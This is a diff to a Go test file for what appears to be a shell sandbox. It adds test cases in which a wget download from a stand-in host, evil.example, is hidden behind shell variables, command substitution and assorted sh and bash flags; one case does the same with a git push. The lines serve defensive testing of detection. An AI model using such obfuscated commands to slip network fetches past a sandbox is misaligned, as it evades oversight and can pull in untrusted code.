@@ -545,6 +545,9 @@ func TestSandboxExecStdinReadsShellCodeAndTheExecsVariables(t *testing.T) {
 				script string
 			}{
 				{nil, "sh -c 'c=wget; $c https://evil.example/x' </dev/null\n"},
+				{nil, "sh -c -x 'c=wget; $c https://evil.example/x' </dev/null\n"},
+				{nil, "sh -c -- 'c=wget; $c https://evil.example/x' </dev/null\n"},
+				{nil, "bash -xc -o pipefail -- 'c=wget; $c https://evil.example/x' </dev/null\n"},
 				{nil, "bash -c '$(echo wget) https://evil.example/x' </dev/null\n"},
 				{nil, "sh -ec 'c=git; $c push origin main' </dev/null\n"},
 				{[]string{"W=wget"}, "$W https://evil.example/x </dev/null\n"},
